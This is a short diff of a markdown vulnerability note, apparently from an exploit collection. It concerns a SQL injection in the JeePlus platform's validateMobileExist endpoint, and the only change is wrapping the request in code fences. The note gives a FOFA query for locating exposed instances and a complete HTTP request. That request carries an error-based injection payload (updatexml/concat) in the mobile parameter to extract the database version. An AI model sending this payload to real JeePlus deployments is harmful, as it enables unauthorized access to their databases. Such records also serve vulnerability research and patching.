@@ -83,6 +83,7 @@ FOFA：app="JeePlus"
 
 POC/EXP：
 
+```http
 GET /a/sys/user/validateMobileExist?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+version%28%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271 HTTP/1.1
 Host: 127.0.0.1:8080
 Cache-Control: max-age=0
@@ -94,6 +95,8 @@ Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Cookie: jeeplus.session.id=a631de098e3a4e4184631a4dcac9f396
 Connection: close
+```
+
 
 ![image-20240222160348373](./.resource/Jeeplus快速开发平台validateMobileExistSQL注入漏洞/media/image-20240222160348373.png)
 
